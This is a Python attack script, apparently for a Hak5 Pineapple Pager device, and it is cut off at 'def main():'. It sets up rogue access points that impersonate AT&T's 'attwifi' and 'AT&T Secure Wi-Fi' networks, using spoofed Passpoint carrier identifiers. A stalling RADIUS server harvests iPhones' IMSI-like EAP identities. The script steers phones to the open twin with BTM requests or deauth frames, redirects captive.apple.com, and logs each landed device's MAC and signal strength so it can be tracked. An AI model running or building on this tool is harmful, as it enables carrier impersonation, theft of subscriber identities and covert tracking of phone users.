#!/usr/bin/env python3
"""
att-open-steer.py -- dual-network `attwifi` / `AT&T Secure Wi-Fi` iPhone
lure + pseudonym capture + open-AP connection.

WHAT THIS DOES
    Brings up TWO BSSs on the 2.4 GHz radio (phy0 / wlan0), both with
    universally-administered BSSIDs:

      1. `AT&T Secure Wi-Fi`  -- WPA2-Enterprise + Hotspot 2.0 / Passpoint
         IEs + local RADIUS. This is the phone's *managed enterprise*
         profile (per iOS Settings > Wi-Fi > Managed Networks). An
         AT&T-provisioned iPhone attempts EAP-AKA'/SIM here and sends its
         carrier NAI (IMSI pseudonym) as the EAP-Identity to our RADIUS
         server, which stalls the exchange (mode=broken). That captures the
         pseudonym and keeps the phone retrying.

      2. `attwifi`            -- truly OPEN (the phone's *managed open*
         profile). iPhone auto-joins this one for real, gets a DHCP lease,
         and becomes a persistent, pingable, RSSI-trackable target.

    Optionally, while a phone is on the enterprise BSS, we can steer it to
    the open twin with an 802.11v BSS Transition Management Request backed by
    an 802.11k neighbor report (hostapd `set_neighbor` + `bss_tm_req`).

WHY TWO DIFFERENT SSIDs
    iOS collapses two same-SSID BSSs of different security into one entry
    and prefers the secured one, and Hotspot 2.0 *requires* WPA2-Enterprise
    (hostapd refuses `hs20=1` on an open BSS). The carrier's `attwifi`
    profile is OPEN; its Passpoint/AKA profile is the separate
    `AT&T Secure Wi-Fi`. So the pseudonym lure must be `AT&T Secure Wi-Fi`
    and the connection target must be `attwifi`.

BSSID NOTE (critical)
    hostapd derives MACs from the radio base and flips the locally-
    administered bit on secondary BSSs (e.g. 0a:.../0e:...), which iOS
    silently filters. We set `wireless.radio0.macaddr_base` +
    `num_global_macaddr` so every vif gets a **universally-administered**
    MAC (00:13:37:xx:xx:xx). Proven live on the Pager.

STABILITY NOTE
    With default hostapd settings the iPhone associates, then is
    `deauthenticated due to inactivity` a few seconds later (the phone sits
    idle in the captive-portal state). We disable inactivity polling:
    `skip_inactivity_poll=1`, `disassoc_low_ack=0`, large `max_inactivity`.

SAFETY
    Reuses the WPAD-SWAP engine (wpad-wolfssl bind-mounted only while
    active; factory wpad always restored on exit). UCI + radio backups are
    restored in cleanup() (signal + atexit guarded).

USAGE
    att-open-steer.py [--no-isolate] [--steer-mode btm|deauth|both|off]
                      [--steer-always] [--radius-mode MODE] [--loot-dir DIR]
                      [--force]
"""

import argparse
import atexit
import os
import random
import signal
import subprocess
import sys
import time
from datetime import datetime

# ---------------------------------------------------------------------------
# interfaces / constants
# ---------------------------------------------------------------------------
AP_OPEN = "wlan0open"   # primary AP vif  -> open `attwifi`
AP_ENT  = "wlan0wpa"    # secondary AP vif -> `AT&T Secure Wi-Fi` (Passpoint)
AP_CLI  = "wlan0cli"

RADIO_OUI   = "00:13:37"
RADIO_BASE  = "00:13:37:ac:af:24"   # factory radio MAC (universal)
CHANNEL     = 6

SSID_OPEN = "attwifi"
SSID_ENT  = "AT&T Secure Wi-Fi"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def _resolve_att_dir():
    for c in [os.environ.get("ATT_DIR", ""),
              "/mmc/root/payloads/user/Skinny-Tools/ATT",
              "/root/payloads/user/Skinny-Tools/ATT",
              os.path.join(os.path.dirname(SCRIPT_DIR), "ATT")]:
        if c and os.path.isfile(os.path.join(c, "radius-reject.py")):
            return c
    return "/mmc/root/payloads/user/Skinny-Tools/ATT"


ATT_DIR        = _resolve_att_dir()
RADIUS_SCRIPT  = os.path.join(ATT_DIR, "radius-reject.py")
IE221_SCRIPT   = os.path.join(ATT_DIR, "v28_ie221.py")
ISOLATE_SCRIPT = os.path.join(ATT_DIR, "v28_isolate.sh")
DHCPD_SCRIPT   = os.path.join(ATT_DIR, "v28_dhcpd.py")
WISPR_SCRIPT   = os.path.join(ATT_DIR, "v28_wispr.py")


def _resolve_wpad_swap():
    for c in [os.environ.get("WPAD_SWAP", ""),
              "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
              "/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
              os.path.join(SCRIPT_DIR, "wpad-swap.sh")]:
        if c and os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh"


WPAD_SCRIPT = _resolve_wpad_swap()

LOG_DIR = "/mmc/root/loot/att-open-steer"

WIRELESS_BAK  = "/tmp/att-open-steer-wireless.bak"
DNSMASQ_BAK   = "/tmp/att-open-steer-dnsmasq.conf.bak"
RADIO_MAC_BAK = "/tmp/att-open-steer-radio-mac.bak"

WISPR_PORT    = 80
RADIUS_SECRET = "testing123"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg, log_fp=None):
    line = f"[{ts()}] {msg}"
    print(line)
    if log_fp:
        log_fp.write(line + "\n")
        log_fp.flush()


def shell_out(cmd, check=False):
    r = subprocess.run(cmd, shell=True, check=check, capture_output=True, text=True)
    return r.stdout.strip()


def uci_set(key, value):
    subprocess.run(f"uci set {key}='{value}'", shell=True, check=False)


def uci_del(key):
    subprocess.run(f"uci -q delete {key}", shell=True, check=False)


def uci_commit(target="wireless"):
    subprocess.run(f"uci commit {target}", shell=True, check=False)


def backup_file(path, bak_path):
    if os.path.exists(path) and not os.path.exists(bak_path):
        with open(path, "rb") as src, open(bak_path, "wb") as dst:
            dst.write(src.read())
        return True
    return False


def wifi_reload():
    subprocess.run("wifi reload", shell=True, check=False)


def stop_pineapd():
    shell_out("killall -TERM pineapd 2>/dev/null; sleep 0.5; "
              "killall -KILL pineapd 2>/dev/null; true")


def start_pineapd():
    shell_out("/etc/init.d/pineapd start 2>/dev/null; true")


def wpad_swap(target, log_fp):
    if not os.path.isfile(WPAD_SCRIPT):
        log(f"[wpad] engine not found at {WPAD_SCRIPT}", log_fp)
        return False
    try:
        rc = subprocess.run([WPAD_SCRIPT, target],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            timeout=180).returncode
    except subprocess.TimeoutExpired:
        rc = 124
    log(f"[wpad] swap target={target} rc={rc}", log_fp)
    return rc == 0


def assert_safe_shell():
    if os.environ.get("ATT_FORCE_WLAN0CLI"):
        return
    conn = os.environ.get("SSH_CONNECTION", "").split()
    if not conn:
        return
    route = shell_out(f"ip route get {conn[0]} 2>/dev/null | head -1")
    if "dev wlan" in route or "dev wl" in route:
        sys.stderr.write(
            f"FATAL: SSH session arrives over WiFi ({route}).\n"
            "Use USB-C Ethernet or on-Pager tmux; set ATT_FORCE_WLAN0CLI=1 to override.\n")
        sys.exit(2)


def verify_bss_up(iface, timeout=90):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if "type AP" in shell_out(f"iw dev {iface} info 2>&1"):
            return True
        time.sleep(1)
    return False


def hostapd_cli(iface, *args, ctrl="/var/run/hostapd"):
    return subprocess.run(["hostapd_cli", "-p", ctrl, "-i", iface] + list(args),
                          capture_output=True, text=True).stdout.strip()


def bss_bssid(iface):
    out = hostapd_cli(iface, "status")
    for line in out.splitlines():
        if line.startswith("bssid[0]"):
            return line.split("=", 1)[1].strip()
    return ""


def stations(iface):
    out = hostapd_cli(iface, "all_sta")
    macs = []
    for line in out.splitlines():
        line = line.strip()
        if len(line) == 17 and line.count(":") == 5:
            macs.append(line.lower())
    return macs


# ---------------------------------------------------------------------------
# UCI configuration
# ---------------------------------------------------------------------------
def set_radio_macs(log_fp):
    """Force universally-administered MACs for every AP vif. Without the
    locally-administered bit flip, iOS accepts our BSSIDs."""
    uci_set("wireless.radio0.macaddr_base", RADIO_BASE)
    uci_set("wireless.radio0.num_global_macaddr", "4")
    log(f"[radio] macaddr_base={RADIO_BASE} num_global_macaddr=4", log_fp)


def configure_open_bss(log_fp):
    """Open `attwifi` -- the phone's managed-OPEN profile; the connect
    target. Keep inactivity timeouts off so the phone stays put."""
    uci_set("wireless.wlan0open.ssid", SSID_OPEN)
    uci_set("wireless.wlan0open.encryption", "none")
    uci_set("wireless.wlan0open.hidden", "0")
    uci_set("wireless.wlan0open.disabled", "0")
    # stability: never deauth an idle (captive-portal) phone
    uci_set("wireless.wlan0open.skip_inactivity_poll", "1")
    uci_set("wireless.wlan0open.disassoc_low_ack", "0")
    uci_set("wireless.wlan0open.max_inactivity", "86400")
    # 802.11k/v capability (needed if we steer TO this BSS)
    uci_set("wireless.wlan0open.ieee80211k", "1")
    uci_set("wireless.wlan0open.bss_transition", "1")
    uci_set("wireless.wlan0open.rrm_neighbor_report", "1")
    uci_commit()
    log(f"[open] {AP_OPEN} = open {SSID_OPEN!r}", log_fp)


def configure_ent_bss(log_fp):
    """`AT&T Secure Wi-Fi` -- WPA2-Enterprise + HS2.0 Passpoint lure. The
    carrier enterprise profile doing EAP-AKA' lives on this SSID."""
    uci_set("wireless.wlan0wpa.ssid", SSID_ENT)
    uci_set("wireless.wlan0wpa.encryption", "wpa2")
    uci_set("wireless.wlan0wpa.wpa_key_mgmt", "WPA-EAP")
    uci_set("wireless.wlan0wpa.ieee8021x", "1")
    uci_set("wireless.wlan0wpa.eap_type", "aka")
    uci_set("wireless.wlan0wpa.auth_server", "127.0.0.1")
    uci_set("wireless.wlan0wpa.auth_port", "1812")
    uci_set("wireless.wlan0wpa.auth_secret", RADIUS_SECRET)
    uci_set("wireless.wlan0wpa.iw_enabled", "1")
    uci_set("wireless.wlan0wpa.iw_internet", "1")
    uci_set("wireless.wlan0wpa.iw_access_network_type", "2")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_roaming_consortium")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=310410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=506F9A")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_nai_realm")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=0,att.net,*,23")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=1,att.net,*,50")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_domain_name")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=att.net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=attwireless.net")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,260")
    uci_set("wireless.wlan0wpa.iw_venue_group", "2")
    uci_set("wireless.wlan0wpa.iw_venue_type", "8")
    uci_set("wireless.wlan0wpa.iw_venue_name", "eng:ATandT-Secure-WiFi")
    uci_set("wireless.wlan0wpa.iw_venue_url", "https://www.att.com/wifi")
    uci_set("wireless.wlan0wpa.hs20", "1")
    uci_set("wireless.wlan0wpa.hs20_oper_friendly_name", "eng:ATandT-Secure-WiFi")
    uci_set("wireless.wlan0wpa.hs20_conn_capab", "6:1:1")
    uci_set("wireless.wlan0wpa.disable_dgaf", "1")
    uci_set("wireless.wlan0wpa.hs20_deauth_req_timeout", "60")
    uci_set("wireless.wlan0wpa.ieee80211k", "1")
    uci_set("wireless.wlan0wpa.bss_transition", "1")
    uci_set("wireless.wlan0wpa.rrm_neighbor_report", "1")
    uci_set("wireless.wlan0wpa.time_advertisement", "1")
    # stability while authenticating/stalling
    uci_set("wireless.wlan0wpa.skip_inactivity_poll", "1")
    uci_set("wireless.wlan0wpa.disassoc_low_ack", "0")
    uci_set("wireless.wlan0wpa.max_inactivity", "86400")
    uci_set("wireless.wlan0wpa.disabled", "0")
    uci_commit()
    log(f"[ent] {AP_ENT} = Passpoint {SSID_ENT!r}", log_fp)


def install_dnsmasq_captive(server_ip, log_fp):
    backup_file("/etc/dnsmasq.conf", DNSMASQ_BAK)
    existing = ""
    if os.path.exists("/etc/dnsmasq.conf"):
        with open("/etc/dnsmasq.conf") as f:
            existing = f.read()
    # Strip any prior captive override (possibly pointing at a stale IP from a
    # previous isolate/non-isolate run) before adding the current one.
    keep = [l for l in existing.splitlines()
            if "captive.apple.com" not in l and "att-open-steer captive" not in l]
    line = f"address=/captive.apple.com/{server_ip}"
    keep.append("")
    keep.append("# att-open-steer captive override")
    keep.append(line)
    with open("/etc/dnsmasq.conf", "w") as f:
        f.write("\n".join(keep) + "\n")
    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
    log(f"[dnsmasq] captive.apple.com -> {server_ip}", log_fp)


def remove_dnsmasq_captive(log_fp):
    if os.path.exists(DNSMASQ_BAK):
        subprocess.run(["cp", DNSMASQ_BAK, "/etc/dnsmasq.conf"], check=False)
        os.remove(DNSMASQ_BAK)
    else:
        # strip any stale override lines we may have added in prior runs
        if os.path.exists("/etc/dnsmasq.conf"):
            with open("/etc/dnsmasq.conf") as f:
                lines = f.readlines()
            keep = [l for l in lines
                    if "captive.apple.com" not in l
                    and "att-open-steer captive" not in l]
            with open("/etc/dnsmasq.conf", "w") as f:
                f.writelines(keep)
    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
    log("[dnsmasq] captive override removed", log_fp)


# ---------------------------------------------------------------------------
# internet routing: give the phone's network DHCP-DNS + NAT out the uplink
# ---------------------------------------------------------------------------
def uplink_iface():
    """The Pager's current internet uplink interface (client Wi-Fi / eth).

    Parse ONLY the `default via ... dev X` route; ignore link-scope routes.
    """
    out = shell_out("ip route show default 2>/dev/null")
    for line in out.splitlines():
        parts = line.split()
        if parts[:1] == ["default"] and "dev" in parts:
            return parts[parts.index("dev") + 1]
    return ""


def restore_uplink(log_fp, timeout=70):
    """Wait for the client-WiFi uplink to have a default route, actively
    re-requesting DHCP and, failing that, re-applying the snapshotted static
    address so the phone keeps real internet."""
    deadline = time.time() + timeout
    nudged = False
    reapplied = False
    while time.time() < deadline:
        up = uplink_iface()
        if up and up not in ("br-lan", "br-att"):
            log(f"[net] uplink up: {up}", log_fp)
            return True
        upif = ""
        for ifc in ("wlan0cli", "wlan1cli", "wlan2cli"):
            if "type managed" in shell_out(f"iw dev {ifc} info 2>&1"):
                upif = ifc
                break
        if upif and not nudged:
            log(f"[net] nudging DHCP on {upif}", log_fp)
            shell_out(f"killall udhcpc 2>/dev/null; "
                      f"udhcpc -i {upif} -n -q -t 5 >/dev/null 2>&1; true")
            nudged = True
        elif not reapplied and _UPLINK_SNAP.get("addr"):
            # DHCP gave up; fall back to the address the uplink had before.
            reapply_uplink(log_fp)
            reapplied = True
        else:
            shell_out("wifi up >/dev/null 2>&1; true")
        time.sleep(3)
    # one last hard attempt
    if _UPLINK_SNAP.get("addr"):
        reapply_uplink(log_fp)
    ok = uplink_iface() not in ("", None, "br-lan", "br-att")
    if not ok:
        log("[net] WARNING: uplink still down; phone may lack internet", log_fp)
    return ok


_net_rules = {"done": False}


def ensure_internet_routing(ap_ifaces, log_fp, force=False):
    """NAT + forward the AP networks out the real uplink.

    Hak5's fw4 often omits the client-Wi-Fi uplink from the wan-zone NAT so
    downstream clients get an IP but no internet -> iOS drops the network.
    Idempotent; safe to call repeatedly (used as a self-heal in the loop).
    """
    up = uplink_iface()
    if not up or up in ("br-lan", "br-att"):
        return False
    if _net_rules["done"] and not force:
        return True

    bridges = set()
    for ifc in ap_ifaces:
        m = shell_out(f"ip link show {ifc} 2>/dev/null | grep -o 'master [a-z0-9-]*'")
        if m:
            bridges.add(m.split()[1])
    if not bridges:
        bridges = {"br-lan"}

    ruleset = shell_out("nft list ruleset 2>/dev/null")
    for br in sorted(bridges):
        # forward accept AP-bridge -> uplink (inserted before the drop policy)
        already_fwd = f'iifname "{br}" oifname "{up}"' in ruleset
        if not already_fwd:
            shell_out(f'nft insert rule inet fw4 forward iifname "{br}" '
                      f'oifname "{up}" accept 2>/dev/null; true')
        # masquerade AP-bridge traffic out the uplink
        already_masq = f'oifname "{up}"' in ruleset and "masquerade" in ruleset
        if not already_masq:
            shell_out(f'nft add rule inet fw4 srcnat oifname "{up}" '
                      f'meta nfproto ipv4 masquerade 2>/dev/null; true')
        log(f"[net] routed {br} -> {up} (NAT + forward)", log_fp)

    shell_out("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; true")
    _net_rules["done"] = True
    return True


# ---------------------------------------------------------------------------
# 802.11k/v steering (enterprise BSS -> open BSS)
# ---------------------------------------------------------------------------
def _freq_to_ch(freq):
    if freq == 2484:
        return 14
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    return freq


def open_bss_channel():
    out = hostapd_cli(AP_OPEN, "status")
    for line in out.splitlines():
        if line.startswith("freq="):
            try:
                return _freq_to_ch(int(line.split("=", 1)[1]))
            except Exception:
                pass
    return CHANNEL


def add_neighbor_for_open(target_mac):
    ob = bss_bssid(AP_OPEN)
    if not ob:
        return False, "no open bssid"
    ch = open_bss_channel()
    # nr = bssid(6) bssid_info(4) op_class(1) channel(1) phy_type(1)
    nr = (ob.replace(":", "") + "00000051" + f"{81:02x}{ch:02x}08")
    ssid_hex = SSID_OPEN.encode().hex()
    out = hostapd_cli(AP_ENT, "set_neighbor", target_mac,
                      f"ssid={ssid_hex}", f"nr={nr}")
    return ("FAIL" not in out.upper()), f"set_neighbor {ob} ch={ch} -> {out!r}"


def send_btm(target_mac, disassoc_timer=5, valid_int=30):
    ob = bss_bssid(AP_OPEN)
    args = [target_mac]
    if ob:
        args += ["neighbor=" + ob, "pref=1"]
    args += [f"disassoc_timer={disassoc_timer}", f"valid_int={valid_int}",
             "abridged=1"]
    out = hostapd_cli(AP_ENT, "bss_tm_req", *args)
    return ("FAIL" not in out.upper()), (out or "(sent)")


def deauth_ent(target_mac):
    out = hostapd_cli(AP_ENT, "deauthenticate", target_mac)
    return ("FAIL" not in out.upper()), (out or "(sent)")


def steer_station(mac, args, log_fp):
    res = []
    if args.steer_mode in ("btm", "both"):
        ok_n, _ = add_neighbor_for_open(mac)
        ok_b, _ = send_btm(mac, args.disassoc_timer)
        res.append(f"neighbor={'ok' if ok_n else 'FAIL'} btm={'ok' if ok_b else 'FAIL'}")
    if args.steer_mode in ("deauth", "both"):
        ok_d, _ = deauth_ent(mac)
        res.append(f"deauth={'ok' if ok_d else 'FAIL'}")
    return " | ".join(res) if res else "(steer off)"


# ---------------------------------------------------------------------------
# pseudonym capture
# ---------------------------------------------------------------------------
def parse_usernames(logfile):
    users = []
    if not os.path.exists(logfile):
        return users
    with open(logfile) as f:
        for line in f:
            if "username=" not in line:
                continue
            try:
                q = line.split("username=", 1)[1].split("'")[1]
                if q and q not in users:
                    users.append(q)
            except Exception:
                pass
    return users


def look_like_imsi(u):
    core = u.split("@")[0]
    core = core[1:] if core[:1] in ("0", "1") else core
    return core.isdigit() and 10 <= len(core) <= 16


# ---------------------------------------------------------------------------
# uplink preservation (the phone needs real internet or iOS drops the network)
# ---------------------------------------------------------------------------
# Bringing the APs up on phy0 knocks the client-WiFi uplink off its DHCP lease;
# the interface re-associates but never gets an IPv4/default route back, so
# downstream clients have no internet and iOS disconnects. We snapshot the
# uplink's address/prefix/gateway BEFORE the radio churn and re-apply it
# statically afterwards.
_UPLINK_SNAP = {}


def snapshot_uplink(log_fp):
    """Record the current uplink IP/prefix/gateway so we can restore it."""
    up = uplink_iface()
    if not up or up in ("br-lan", "br-att"):
        log("[net] no uplink to snapshot (phone may have no internet)", log_fp)
        return
    addr = shell_out(f"ip -o -4 addr show {up} 2>/dev/null | awk '{{print $4}}' | head -1")
    gw = shell_out(f"ip route show default 2>/dev/null | awk '/via/{{print $3}}' | head -1")
    if addr:
        _UPLINK_SNAP["iface"] = up
        _UPLINK_SNAP["addr"] = addr            # e.g. 10.0.163.222/16
        _UPLINK_SNAP["gw"] = gw
        log(f"[net] snapshot uplink {up} addr={addr} gw={gw}", log_fp)


def reapply_uplink(log_fp):
    """Re-apply the snapshotted uplink address if it has no default route."""
    up = _UPLINK_SNAP.get("iface", "wlan0cli")
    if not _UPLINK_SNAP.get("addr"):
        return False
    if uplink_iface() not in ("", None) and uplink_iface() not in ("br-lan", "br-att"):
        return True
    addr = _UPLINK_SNAP["addr"]
    gw = _UPLINK_SNAP.get("gw", "")
    log(f"[net] re-applying static uplink {up} {addr} gw={gw}", log_fp)
    shell_out(f"killall udhcpc 2>/dev/null; true")
    shell_out(f"ip addr flush dev {up} 2>/dev/null; "
              f"ip addr add {addr} dev {up} 2>/dev/null; "
              f"ip link set {up} up 2>/dev/null; true")
    if gw:
        shell_out(f"ip route replace default via {gw} dev {up} 2>/dev/null; true")
    return bool(uplink_iface())


def inject_hold_station(iface=AP_OPEN, log_fp=None):
    """Guarantee the AP never deauths an idle client.

    hostapd-sh omits `ap_max_inactivity` when we set max_inactivity=0, so the
    running hostapd falls back to its 300s default and drops the iPhone while
    it sits in the captive-portal flow. We patch the generated hostapd config
    to add an explicit `ap_max_inactivity=0` (disable) to the BSS block, then
    SIGHUP hostapd so it re-reads. Re-applied after every wifi reload.
    """
    conf = "/var/run/hostapd-phy0.conf"
    if not os.path.exists(conf):
        return False
    try:
        with open(conf) as f:
            lines = f.readlines()
    except OSError:
        return False

    # find the interface=/bss= block for iface and insert ap_max_inactivity=0
    out = []
    in_block = False
    inserted = False
    blk_re_matches = lambda l: (l.startswith("interface=") or l.startswith("bss="))
    for i, line in enumerate(lines):
        if blk_re_matches(line):
            in_block = line.strip().endswith("=" + iface)
        out.append(line)
        # insert right after the block's ssid line if present, else after header
        if in_block and not inserted and line.startswith("ssid="):
            out.append("ap_max_inactivity=0\n")
            inserted = True
    if not inserted:
        # fall back: drop it right after the interface= line
        out = []
        for line in lines:
            out.append(line)
            if line.strip() == f"interface={iface}":
                out.append("ap_max_inactivity=0\n")
                inserted = True
    if not inserted:
        return False
    try:
        with open(conf, "w") as f:
            f.writelines(out)
    except OSError:
        return False
    shell_out("killall -HUP hostapd 2>/dev/null; true")
    if log_fp:
        log(f"[hold] injected ap_max_inactivity=0 into {iface} block", log_fp)
    return True


# ---------------------------------------------------------------------------
# run loop
# ---------------------------------------------------------------------------
def run(args, log_fp):
    assert_safe_shell()
    # capture the uplink's current address BEFORE we touch the radio
    snapshot_uplink(log_fp)
    if not wpad_swap("wolfssl", log_fp):
        log("[FATAL] wpad-wolfssl unavailable", log_fp)
        return 1

    backup_file("/etc/config/wireless", WIRELESS_BAK)
    if os.path.exists("/sys/class/ieee80211/phy0/macaddress"):
        backup_file("/sys/class/ieee80211/phy0/macaddress", RADIO_MAC_BAK)

    # bring the radio base back to the factory universal MAC first
    shell_out(f"echo {RADIO_BASE} > /sys/class/ieee80211/phy0/macaddress")

    set_radio_macs(log_fp)
    configure_open_bss(log_fp)
    configure_ent_bss(log_fp)
    stop_pineapd()
    wifi_reload()

    if not verify_bss_up(AP_OPEN, timeout=90):
        log("[FATAL] open attwifi BSS did not come up", log_fp)
        return 1
    if not verify_bss_up(AP_ENT, timeout=90):
        log("[WARN] enterprise (Passpoint) BSS did not come up", log_fp)
    time.sleep(2)
    if CHANNEL:
        shell_out(f"iw phy phy0 set channel {CHANNEL} 2>/dev/null; true")

    # The AP bring-up (wpad restart + wifi reload) shares phy0 with the
    # wlan0cli uplink and often knocks the uplink offline. Wait for it to
    # reassociate so the phone gets real internet (otherwise iOS drops us).
    restore_uplink(log_fp)

    # Ensure neither BSS deauths an idle client (the iPhone sits idle in the
    # captive-portal flow and would otherwise be dropped ~10s in).
    inject_hold_station(AP_OPEN, log_fp)
    inject_hold_station(AP_ENT, log_fp)

    log(f"[bss] {SSID_OPEN!r:22} {AP_OPEN} bssid={bss_bssid(AP_OPEN)}", log_fp)
    log(f"[bss] {SSID_ENT!r:22} {AP_ENT} bssid={bss_bssid(AP_ENT)}", log_fp)

    # captive portal / DHCP for the open twin.
    #
    # DEFAULT is --no-isolate: wlan0open stays a br-lan member so the Pager's
    # own dnsmasq (172.16.52.1) hands the phone an IP and our captive override
    # points captive.apple.com at a reachable address. The isolate path
    # (dedicated br-att) is available but flaky on this firmware because the
    # `wifi reload`/`iw set channel` that follow can re-bridge wlan0open back
    # to br-lan; when that happens the phone sees no DHCP and spins forever.
    if args.isolate:
        # Re-assert bridge membership AFTER the radio has fully settled.
        shell_out(f"{ISOLATE_SCRIPT} up")
        server_ip = "192.168.99.1"
        dhp = subprocess.Popen(
            ["python3", DHCPD_SCRIPT, server_ip],
            stdout=open(os.path.join(args.run_dir, "dhcpd.log"), "a", buffering=1),
            stderr=subprocess.STDOUT)
        args.dhcp_pid = dhp.pid
        time.sleep(1)
        # sanity: warn if wlan0open is not actually on br-att
        master = shell_out("ip link show wlan0open 2>/dev/null | grep -o 'master [a-z0-9-]*'")
        if "br-att" not in master:
            log(f"[warn] wlan0open not on br-att (got {master!r}); DHCP may fail",
                log_fp)
    else:
        server_ip = "172.16.52.1"
    install_dnsmasq_captive(server_ip, log_fp)

    # Give the phone's network real internet (NAT out the uplink). Without this
    # iOS marks the network "no internet" and disconnects after ~10-30s.
    ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)

    # IE-221 OUIs on the open attwifi (legacy hotspot signature)
    shell_out(f"python3 {IE221_SCRIPT} --ifname {AP_OPEN}")
    shell_out("killall -HUP hostapd 2>/dev/null; true")
    time.sleep(1)

    # RADIUS on the enterprise BSS -> pseudonym capture + stall
    radius_log = os.path.join(args.run_dir, "radius.log")
    radius = subprocess.Popen(
        ["python3", RADIUS_SCRIPT, "--bind", "127.0.0.1", "--port", "1812",
         "--secret", RADIUS_SECRET, "--mode", args.radius_mode,
         "--log", radius_log],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"[radius] PID={radius.pid} mode={args.radius_mode}", log_fp)

    # WISPr portal on the open twin
    wispr = subprocess.Popen(
        ["python3", WISPR_SCRIPT, "--port", str(WISPR_PORT),
         "--log", os.path.join(args.run_dir, "wispr.log"),
         "--server-ip", server_ip, "--wispr-mode", "apple-success"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"[wispr] PID={wispr.pid}", log_fp)

    loop(args, log_fp, radius, wispr)
    return 0


def loop(args, log_fp, radius, wispr):
    log("[loop] waiting for iPhone (open attwifi + AT&T Secure Wi-Fi both up)", log_fp)
    seen_users = []
    steered = {}
    landed = set()
    started = time.time()
    last_status = 0
    last_steer = 0

    while True:
        time.sleep(1)
        now = time.time()

        # pseudonym capture
        for u in parse_usernames(os.path.join(args.run_dir, "radius.log")):
            if u not in seen_users:
                seen_users.append(u)
                flag = " [IMSI-LIKE]" if look_like_imsi(u) else ""
                log(f"[pseudonym] CAPTURED outer-id: {u!r}{flag}", log_fp)
                shell_out(f"LOG green 'pseudonym: {u}' 2>/dev/null")

        # steering (optional)
        if args.steer_mode != "off" and (now - last_steer) >= args.steer_interval:
            for mac in stations(AP_ENT):
                n = steered.get(mac, 0)
                if n >= args.max_steer_attempts:
                    continue
                if not args.steer_always and not seen_users:
                    continue
                if n == 0 and (now - started) < args.steer_after:
                    continue
                msg = steer_station(mac, args, log_fp)
                steered[mac] = n + 1
                log(f"[steer] {mac} #{n+1} mode={args.steer_mode} | {msg}", log_fp)
            if stations(AP_ENT):
                last_steer = now

        # landed on the open twin
        for mac in stations(AP_OPEN):
            if mac in landed:
                continue
            landed.add(mac)
            st = shell_out(f"iw dev {AP_OPEN} station get {mac} 2>/dev/null")
            rssi = next((l.strip() for l in st.splitlines() if "signal:" in l), "")
            log(f"[landed] {mac} on OPEN {SSID_OPEN!r} {rssi}", log_fp)
            shell_out(f"LOG green 'landed: {mac}' 2>/dev/null")

        if now - last_status > 30:
            last_status = now
            # self-heal: (re)install NAT/forward rules once the uplink is back,
            # and re-apply the uplink address if it flapped.
            if not _net_rules["done"]:
                ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
            if uplink_iface() in ("", None, "br-lan", "br-att"):
                reapply_uplink(log_fp)
            log(f"[status] ent_stas={len(stations(AP_ENT))} "
                f"open_stas={len(stations(AP_OPEN))} steered={len(steered)} "
                f"landed={len(landed)} pseudonyms={len(seen_users)} "
                f"uplink={uplink_iface()}", log_fp)

        if radius.poll() is not None:
            log("[loop] radius exited; stopping", log_fp)
            break
        if wispr.poll() is not None:
            log("[loop] wispr exited; stopping", log_fp)
            break


# ---------------------------------------------------------------------------
# cleanup
# ---------------------------------------------------------------------------
_cleanup_done = [False]


def cleanup(args, log_fp):
    if _cleanup_done[0]:
        return
    _cleanup_done[0] = True
    log("[cleanup] starting", log_fp)

    shell_out("pkill -TERM -f radius-reject.py 2>/dev/null; "
              "pkill -TERM -f v28_dhcpd.py 2>/dev/null; "
              "pkill -TERM -f v28_wispr.py 2>/dev/null; true")
    time.sleep(1)
    shell_out("pkill -KILL -f radius-reject.py 2>/dev/null; "
              "pkill -KILL -f v28_dhcpd.py 2>/dev/null; "
              "pkill -KILL -f v28_wispr.py 2>/dev/null; true")

    remove_dnsmasq_captive(log_fp)
    shell_out(f"{ISOLATE_SCRIPT} down", check=False)

    if os.path.exists(RADIO_MAC_BAK):
        with open(RADIO_MAC_BAK) as f:
            orig = f.read().strip()
        if orig:
            shell_out(f"echo {orig} > /sys/class/ieee80211/phy0/macaddress")
        os.remove(RADIO_MAC_BAK)

    if os.path.exists(WIRELESS_BAK):
        subprocess.run(["cp", WIRELESS_BAK, "/etc/config/wireless"], check=False)
        os.remove(WIRELESS_BAK)
        log("[cleanup] restored /etc/config/wireless", log_fp)

    shell_out("hostapd_cli -p /var/run/hostapd -i wlan0wpa remove_neighbor "
              "00:00:00:00:00:00 2>/dev/null; true")
    # Drop the NAT/forward rules we may have added (reload regenerates fw4).
    shell_out("/etc/init.d/firewall reload >/dev/null 2>&1; true")
    wifi_reload()
    wpad_swap("stock", log_fp)
    start_pineapd()
    log("[cleanup] done", log_fp)


def main():
